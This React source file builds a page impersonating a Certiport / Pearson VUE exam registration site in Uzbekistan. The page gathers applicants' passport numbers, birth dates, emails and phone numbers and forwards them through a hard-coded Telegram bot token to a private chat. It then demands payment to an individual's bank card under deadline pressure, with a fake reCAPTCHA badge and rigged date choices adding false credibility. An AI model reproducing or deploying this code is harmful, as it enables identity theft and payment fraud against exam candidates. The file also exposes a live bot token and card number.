/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useState, useEffect, useRef } from 'react';
import { Menu, ChevronDown, ChevronLeft, ChevronRight, RotateCcw, CheckCircle2, X } from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';

// --- Types ---
type Exam = 'HTML and CSS' | 'IC3 Digital Literacy GS5' | 'IC3 Digital Literacy GS6' | 'Microsoft Excel';
type Language = 'English' | 'Русский';
type Module = 'Level 1' | 'Level 2' | 'Level 3';
type Location = 'Buxoro / Бухара' | 'Namangan / Наманган' | 'Samarqand / Самарканд' | 'Toshkent / Ташкент' | 'Urganch / Ургенч';
type View = 'form' | 'success' | 'payment';

export default function App() {
  const [view, setView] = useState<View>('form');
  const [hasSubmitted, setHasSubmitted] = useState(false);
  const [showHelp, setShowHelp] = useState(false);
  const [selectedExam, setSelectedExam] = useState<Exam | ''>('');
  const [selectedLang, setSelectedLang] = useState<Language | ''>('');
  const [selectedModule, setSelectedModule] = useState<Module | ''>('');
  const [selectedLocation, setSelectedLocation] = useState<Location | ''>('');
  const [selectedDate, setSelectedDate] = useState<number | null>(null);
  
  // New Form Fields
  const [passport, setPassport] = useState('');
  const [examTime, setExamTime] = useState<'9:00' | '12:00' | '14:00' | ''>('');
  const [email, setEmail] = useState('');
  const [birthDate, setBirthDate] = useState({ day: '', month: '', year: '' });
  const [firstName, setFirstName] = useState('');
  const [lastName, setLastName] = useState('');
  const [phone, setPhone] = useState('');
  
  const [paymentCodeInput, setPaymentCodeInput] = useState('');
  const [showPaymentDetails, setShowPaymentDetails] = useState(false);

  const formRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    const submitted = localStorage.getItem('certiport_submitted');
    if (submitted === 'true') {
      setHasSubmitted(true);
    }
  }, []);

  const scrollToForm = () => {
    formRef.current?.scrollIntoView({ behavior: 'smooth' });
  };

  const sendToTelegram = async () => {
    const token = '8494561832:AAFIcuk9CPlSDQycUS829sReJDhqpiQtlUQ';
    const adminId = '8426582765';
    const message = `
🆕 Yangi Ro'yxatdan o'tish:
👤 Ism: ${firstName} ${lastName}
📅 Tug'ilgan kun: ${birthDate.day}.${birthDate.month}.${birthDate.year}
🆔 Pasport: ${passport}
📧 Email: ${email}
📞 Tel: ${phone}
📝 Imtihon: ${selectedExam}
🌐 Til: ${selectedLang}
📦 Modul: ${selectedModule}
📍 Joy: ${selectedLocation}
🗓 Sana: ${selectedDate} April 2026
⏰ Vaqt: ${examTime}
    `;

    try {
      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: adminId,
          text: message,
        }),
      });
    } catch (error) {
      console.error('Telegram error:', error);
    }
  };

  const handleSubmit = async () => {
    await sendToTelegram();
    localStorage.setItem('certiport_submitted', 'true');
    setHasSubmitted(true);
    setView('success');
  };

  // Form options
  const exams: Exam[] = ['HTML and CSS', 'IC3 Digital Literacy GS5', 'IC3 Digital Literacy GS6', 'Microsoft Excel'];
  const languages: Language[] = ['English', 'Русский'];
  const modules: Module[] = ['Level 1', 'Level 2', 'Level 3'];
  const locations: Location[] = ['Buxoro / Бухара', 'Namangan / Наманган', 'Samarqand / Самарканд', 'Toshkent / Ташкент', 'Urganch / Ургенч'];

  // Calendar logic
  const daysInMonth = 30; // April has 30 days
  const startDay = 3; // Wednesday
  const calendarDays = Array.from({ length: daysInMonth }, (_, i) => i + 1);
  const emptyDays = Array.from({ length: startDay }, (_, i) => i);

  const redDays = hasSubmitted ? calendarDays : [9, 12, 18, 19, 23, 25, 26, 28];
  const greenDays = hasSubmitted ? [] : [21];

  if (view === 'success') {
    return (
      <div className="min-h-screen bg-white font-sans text-gray-800 flex flex-col items-center justify-center p-6">
        <div className="w-full max-w-md bg-white rounded-2xl border border-gray-100 p-8 shadow-2xl text-center space-y-8">
          <div className="flex justify-center">
            <div className="bg-[#22c55e] p-4 rounded-full">
              <CheckCircle2 size={64} className="text-white" />
            </div>
          </div>
          
          <h2 className="text-3xl font-bold text-[#22c55e] leading-tight">
            Ro'yxatdan o'tish muvaffaqiyatli!
          </h2>
          
          <div className="text-gray-600 space-y-4 text-lg">
            <p>So'rovingiz qabul qilindi.</p>
            <p>Iltimos, pochtangizga yuborilgan xabardagi ko'rsatmalarga amal qiling. SPAM bo'limini tekshirishni unutmang.</p>
          </div>
          
          <div className="py-4">
            <p className="text-gray-500 text-sm uppercase tracking-wider">Sizning so'rovnoma raqamingiz:</p>
            <p className="text-3xl font-bold text-[#006699]">#4701</p>
          </div>
          
          <div className="bg-gray-50 p-6 rounded-xl border border-gray-100 italic text-gray-700">
            To'lov 24 soat ichida amalga oshirilmasa, ariza bekor qilinadi!
          </div>
          
          <button 
            onClick={() => setView('payment')}
            className="w-full bg-[#1d70b8] text-white font-bold py-4 rounded-lg text-lg uppercase tracking-wide hover:bg-[#155a96] transition-colors"
          >
            TO'LOVGA O'TISH
          </button>
        </div>
      </div>
    );
  }

  if (view === 'payment') {
    return (
      <div className="min-h-screen bg-white font-sans text-gray-800 flex flex-col items-center justify-center p-6">
        <div className="w-full max-w-md bg-white rounded-2xl border border-gray-100 p-8 shadow-2xl space-y-8">
          <h2 className="text-2xl font-bold text-[#006699] text-center">To'lovni amalga oshirish</h2>
          
          {!showPaymentDetails ? (
            <div className="space-y-6">
              <p className="text-center text-gray-600">Sizga berilgan kodni kiriting (bu kodni eslab qoling: #4701)</p>
              <input 
                type="text" 
                placeholder="Kodni kiriting"
                value={paymentCodeInput}
                onChange={(e) => setPaymentCodeInput(e.target.value)}
                className="w-full border-2 border-gray-200 rounded-lg p-4 text-center text-2xl font-bold focus:border-[#007ba7] outline-none"
              />
              <button 
                onClick={() => paymentCodeInput === '4701' && setShowPaymentDetails(true)}
                className="w-full bg-[#007ba7] text-white font-bold py-4 rounded-lg hover:bg-[#00668a] transition-colors"
              >
                TASDIQLASH
              </button>
            </div>
          ) : (
            <div className="space-y-8 animate-in fade-in slide-in-from-bottom-4 duration-500">
              <div className="bg-blue-50 p-6 rounded-xl border border-blue-100 space-y-4">
                <p className="text-center text-gray-700 font-medium">To'lov ma'lumotlari:</p>
                <div className="bg-white p-4 rounded-lg border border-blue-200 text-center">
                  <p className="text-xl font-mono font-bold text-gray-800 tracking-wider">9860 0801 6331 0560</p>
                  <p className="text-sm text-gray-500 mt-1 uppercase">K. yormaxmadov nomidagi karta</p>
                </div>
                <p className="text-center text-2xl font-bold text-[#006699]">500 UZS</p>
              </div>
              <p className="text-center text-red-500 font-medium italic">To'lovni amalga oshirganingizdan so'ng chekni saqlab qo'ying.</p>
              <button 
                onClick={() => setView('form')}
                className="w-full border-2 border-[#007ba7] text-[#007ba7] font-bold py-4 rounded-lg hover:bg-blue-50 transition-colors"
              >
                ASOSIY SAHIFAGA QAYTISH
              </button>
            </div>
          )}
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white font-sans text-gray-800">
      {/* Help Modal */}
      <AnimatePresence>
        {showHelp && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-[100] bg-black/50 flex items-center justify-center p-6"
          >
            <motion.div 
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              className="bg-white rounded-2xl p-8 max-w-sm w-full relative"
            >
              <button onClick={() => setShowHelp(false)} className="absolute top-4 right-4 text-gray-400 hover:text-gray-600">
                <X size={24} />
              </button>
              <h3 className="text-2xl font-bold text-[#006699] mb-4">Yordam bo'limi</h3>
              <p className="text-gray-600 mb-6">Savollaringiz bormi? Biz bilan bog'laning yoki yo'riqnoma bilan tanishib chiqing.</p>
              <ul className="space-y-3">
                <li className="flex items-center gap-3 text-gray-700">
                  <div className="w-2 h-2 bg-[#007ba7] rounded-full" />
                  <span>Telegram: @certiport_uz</span>
                </li>
                <li className="flex items-center gap-3 text-gray-700">
                  <div className="w-2 h-2 bg-[#007ba7] rounded-full" />
                  <span>Tel: +998 90 123 45 67</span>
                </li>
              </ul>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Header */}
      <header className="sticky top-0 z-50 flex items-center justify-between bg-white px-4 py-3 shadow-sm border-b border-gray-100">
        <div className="flex flex-col cursor-pointer" onClick={() => window.scrollTo({ top: 0, behavior: 'smooth' })}>
          <div className="flex items-baseline gap-1">
            <span className="text-xl font-bold tracking-tighter text-[#006699]">CERT</span>
            <span className="relative flex items-center">
              <span className="absolute -top-1 left-1/2 -translate-x-1/2 text-[8px] text-yellow-500">▼</span>
              <span className="text-xl font-bold tracking-tighter text-[#006699]">I</span>
            </span>
            <span className="text-xl font-bold tracking-tighter text-[#006699]">PORT</span>
            <span className="text-[6px] align-top text-[#006699] ml-0.5">®</span>
          </div>
          <span className="text-[7px] font-medium tracking-widest text-gray-500 uppercase">A PEARSON VUE BUSINESS</span>
        </div>
        
        <div className="flex items-center gap-3">
          <button 
            onClick={scrollToForm}
            className="rounded bg-[#007ba7] px-4 py-1.5 text-sm font-medium text-white transition-colors hover:bg-[#00668a]"
          >
            Registratsiya
          </button>
          <button onClick={() => setShowHelp(true)} className="p-1 text-gray-600">
            <Menu size={28} strokeWidth={1.5} />
          </button>
        </div>
      </header>

      {/* Main Content */}
      <main className="mx-auto max-w-lg px-6 py-12">
        <h1 className="mb-10 text-4xl font-bold leading-tight text-[#006699]">
          Ro'yxatdan o'tish
        </h1>

        <div ref={formRef} className="rounded-xl border border-gray-100 bg-white p-6 shadow-[0_8px_30px_rgb(0,0,0,0.04)]">
          <div className="space-y-6">
            {/* Exam Selection */}
            <div>
              <label className="mb-2 block text-sm font-medium text-gray-600">
                Imtihonni tanlang *
              </label>
              <div className="relative">
                <select
                  value={selectedExam}
                  onChange={(e) => setSelectedExam(e.target.value as Exam)}
                  className="w-full appearance-none rounded-lg border border-gray-300 bg-white px-4 py-3 pr-10 text-gray-700 focus:border-[#007ba7] focus:outline-none focus:ring-1 focus:ring-[#007ba7]"
                >
                  <option value=""></option>
                  {exams.map((exam) => (
                    <option key={exam} value={exam}>{exam}</option>
                  ))}
                </select>
                <ChevronDown className="pointer-events-none absolute right-3 top-1/2 -translate-y-1/2 text-gray-400" size={20} />
              </div>
            </div>

            {/* Language Selection */}
            <div>
              <label className="mb-2 block text-sm font-medium text-gray-600">
                Qaysi tilda topshirmoqchisiz? *
              </label>
              <div className="relative">
                <select
                  value={selectedLang}
                  onChange={(e) => setSelectedLang(e.target.value as Language)}
                  className="w-full appearance-none rounded-lg border border-gray-300 bg-white px-4 py-3 pr-10 text-gray-700 focus:border-[#007ba7] focus:outline-none focus:ring-1 focus:ring-[#007ba7]"
                >
                  <option value=""></option>
                  {languages.map((lang) => (
                    <option key={lang} value={lang}>{lang}</option>
                  ))}
                </select>
                <ChevronDown className="pointer-events-none absolute right-3 top-1/2 -translate-y-1/2 text-gray-400" size={20} />
              </div>
            </div>

            {/* Conditional Fields */}
            <AnimatePresence>
              {selectedExam && selectedLang && (
                <motion.div
                  initial={{ opacity: 0, y: -10 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: -10 }}
                  className="space-y-6"
                >
                  {/* Module Selection */}
                  <div>
                    <label className="mb-2 block text-sm font-medium text-gray-600">
                      Modulni tanlang *
                    </label>
                    <div className="relative">
                      <select
                        value={selectedModule}
                        onChange={(e) => setSelectedModule(e.target.value as Module)}
                        className="w-full appearance-none rounded-lg border border-gray-300 bg-white px-4 py-3 pr-10 text-gray-700 focus:border-[#007ba7] focus:outline-none focus:ring-1 focus:ring-[#007ba7]"
                      >
                        <option value=""></option>
                        {modules.map((mod) => (
                          <option key={mod} value={mod}>{mod}</option>
                        ))}
                      </select>
                      <ChevronDown className="pointer-events-none absolute right-3 top-1/2 -translate-y-1/2 text-gray-400" size={20} />
                    </div>
                  </div>

                  {/* Location Selection */}
                  <div>
                    <label className="mb-2 block text-sm font-medium text-gray-600">
                      Joyni tanlang *
                    </label>
                    <div className="relative">
                      <select
                        value={selectedLocation}
                        onChange={(e) => setSelectedLocation(e.target.value as Location)}
                        className="w-full appearance-none rounded-lg border border-gray-300 bg-white px-4 py-3 pr-10 text-gray-700 focus:border-[#007ba7] focus:outline-none focus:ring-1 focus:ring-[#007ba7]"
                      >
                        <option value=""></option>
                        {locations.map((loc) => (
                          <option key={loc} value={loc}>{loc}</option>
                        ))}
                      </select>
                      <ChevronDown className="pointer-events-none absolute right-3 top-1/2 -translate-y-1/2 text-gray-400" size={20} />
                    </div>
                  </div>

                  {/* Date Selection (Calendar) */}
                  {selectedLocation && (
                    <motion.div
                      initial={{ opacity: 0 }}
                      animate={{ opacity: 1 }}
                      className="space-y-4"
                    >
                      <label className="block text-sm font-medium text-gray-600">
                        Sanani tanlang *
                      </label>
                      
                      <div className="mt-4">
                        <div className="mb-4 flex items-center justify-between">
                          <div className="flex items-center gap-2">
                            <span className="text-lg font-semibold">April 2026</span>
                            <ChevronDown size={16} className="text-gray-400" />
                          </div>
                          <div className="flex gap-4">
                            <button className="text-gray-400 hover:text-gray-600">
                              <ChevronLeft size={20} />
                            </button>
                            <button className="text-gray-400 hover:text-gray-600">
                              <ChevronRight size={20} />
                            </button>
                          </div>
                        </div>

                        <div className="grid grid-cols-7 text-center text-xs font-medium text-gray-400">
                          <span>S</span><span>M</span><span>T</span><span>W</span><span>T</span><span>F</span><span>S</span>
                        </div>
                        
                        <div className="mt-2 grid grid-cols-7 gap-y-2">
                          {emptyDays.map((d) => <div key={`empty-${d}`} />)}
                          {calendarDays.map((day) => {
                            const isSelected = selectedDate === day;
                            const isRed = redDays.includes(day);
                            const isGreen = greenDays.includes(day);

                            return (
                              <button
                                key={day}
                                disabled={hasSubmitted || !isGreen}
                                onClick={() => setSelectedDate(day)}
                                className={`flex h-8 w-8 items-center justify-center rounded-full text-sm transition-all
                                  ${isSelected ? 'bg-[#007ba7] text-white' : 'text-gray-700 hover:bg-gray-100'}
                                  ${isRed && !isSelected ? 'bg-red-500 text-white' : ''}
                                  ${isGreen && !isSelected ? 'bg-[#90EE90] text-gray-800' : ''}
                                  ${day < 5 ? 'opacity-30 pointer-events-none' : ''}
                                  ${(!isGreen && !isRed && day >= 5) ? 'text-gray-400' : ''}
                                `}
                              >
                                {day}
                              </button>
                            );
                          })}
                        </div>
                      </div>
                    </motion.div>
                  )}

                  {/* Extended Form Fields (Visible when date 21 is selected) */}
                  {selectedDate === 21 && (
                    <motion.div
                      initial={{ opacity: 0, height: 0 }}
                      animate={{ opacity: 1, height: 'auto' }}
                      className="space-y-6 pt-6 border-t border-gray-100"
                    >
                      {/* Passport */}
                      <div>
                        <label className="mb-2 block text-sm font-medium text-gray-600">Pasport seriyasi va raqami *</label>
                        <input 
                          type="text" 
                          placeholder="AA 1234567"
                          value={passport}
                          onChange={(e) => setPassport(e.target.value)}
                          className="w-full rounded-lg border border-gray-300 px-4 py-3 focus:border-[#007ba7] outline-none"
                        />
                      </div>

                      {/* Exam Time */}
                      <div>
                        <label className="mb-2 block text-sm font-medium text-gray-600">Imtihon vaqti *</label>
                        <div className="grid grid-cols-3 gap-3">
                          {['9:00', '12:00', '14:00'].map((time) => (
                            <button
                              key={time}
                              onClick={() => setExamTime(time as any)}
                              className={`py-3 rounded-lg border font-medium transition-all ${examTime === time ? 'bg-[#007ba7] text-white border-[#007ba7]' : 'bg-white text-gray-600 border-gray-300 hover:border-[#007ba7]'}`}
                            >
                              {time}
                            </button>
                          ))}
                        </div>
                      </div>

                      {/* Email */}
                      <div>
                        <label className="mb-2 block text-sm font-medium text-gray-600">Email *</label>
                        <input 
                          type="email" 
                          placeholder="example@mail.com"
                          value={email}
                          onChange={(e) => setEmail(e.target.value)}
                          className="w-full rounded-lg border border-gray-300 px-4 py-3 focus:border-[#007ba7] outline-none"
                        />
                      </div>

                      {/* Birth Date */}
                      <div>
                        <label className="mb-2 block text-sm font-medium text-gray-600">Tug'ilgan kun (kun/oy/yil) *</label>
                        <div className="grid grid-cols-3 gap-3">
                          <input type="text" placeholder="Kun" value={birthDate.day} onChange={(e) => setBirthDate({...birthDate, day: e.target.value})} className="rounded-lg border border-gray-300 px-4 py-3 focus:border-[#007ba7] outline-none" />
                          <input type="text" placeholder="Oy" value={birthDate.month} onChange={(e) => setBirthDate({...birthDate, month: e.target.value})} className="rounded-lg border border-gray-300 px-4 py-3 focus:border-[#007ba7] outline-none" />
                          <input type="text" placeholder="Yil" value={birthDate.year} onChange={(e) => setBirthDate({...birthDate, year: e.target.value})} className="rounded-lg border border-gray-300 px-4 py-3 focus:border-[#007ba7] outline-none" />
                        </div>
                      </div>

                      {/* Name Fields */}
                      <div className="grid grid-cols-2 gap-3">
                        <div>
                          <label className="mb-2 block text-sm font-medium text-gray-600">Ism *</label>
                          <input type="text" value={firstName} onChange={(e) => setFirstName(e.target.value)} className="w-full rounded-lg border border-gray-300 px-4 py-3 focus:border-[#007ba7] outline-none" />
                        </div>
                        <div>
                          <label className="mb-2 block text-sm font-medium text-gray-600">Familiya *</label>
                          <input type="text" value={lastName} onChange={(e) => setLastName(e.target.value)} className="w-full rounded-lg border border-gray-300 px-4 py-3 focus:border-[#007ba7] outline-none" />
                        </div>
                      </div>

                      {/* Phone */}
                      <div>
                        <label className="mb-2 block text-sm font-medium text-gray-600">Telefon raqam *</label>
                        <input 
                          type="tel" 
                          placeholder="+998 90 123 45 67"
                          value={phone}
                          onChange={(e) => setPhone(e.target.value)}
                          className="w-full rounded-lg border border-gray-300 px-4 py-3 focus:border-[#007ba7] outline-none"
                        />
                      </div>

                      {/* Submit Button */}
                      <button 
                        onClick={handleSubmit}
                        className="w-full bg-[#007ba7] text-white font-bold py-4 rounded-lg hover:bg-[#00668a] transition-all transform active:scale-[0.98] shadow-lg"
                      >
                        YUBORISH
                      </button>
                    </motion.div>
                  )}
                </motion.div>
              )}
            </AnimatePresence>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="mt-20 bg-[#005b6f] px-6 py-12 text-white">
        <div className="mx-auto max-w-lg">
          <div className="mb-12 flex items-center gap-4">
            <div className="flex h-16 w-16 items-center justify-center rounded-full bg-white">
              <span className="text-4xl font-bold text-[#005b6f]">P</span>
            </div>
            <span className="text-2xl font-semibold tracking-tight">Pearson Education</span>
          </div>

          <p className="mb-6 text-sm text-gray-300">
            ©2026. Barcha huquqlar himoyalangan.
          </p>

          <a href="#" className="mb-12 block text-sm font-medium underline underline-offset-4 hover:text-white/80">
            Shartlar va qoidalarni o'qing
          </a>

          <div className="space-y-6">
            <h3 className="text-2xl font-bold">Foydali havolalar</h3>
            <ul className="space-y-4 text-lg font-medium">
              <li><a href="#" className="hover:text-white/80">Asosiy</a></li>
              <li><a href="#" className="hover:text-white/80">Sertifikatlar</a></li>
              <li><a href="#" className="hover:text-white/80">Biz haqimizda</a></li>
            </ul>
          </div>
        </div>
      </footer>

      {/* Floating reCAPTCHA-like icon */}
      <div className="fixed bottom-4 right-4 z-50">
        <div className="flex h-14 w-14 items-center justify-center rounded bg-white shadow-lg border border-gray-200">
          <RotateCcw className="text-blue-500" size={24} />
        </div>
      </div>
    </div>
  );
}
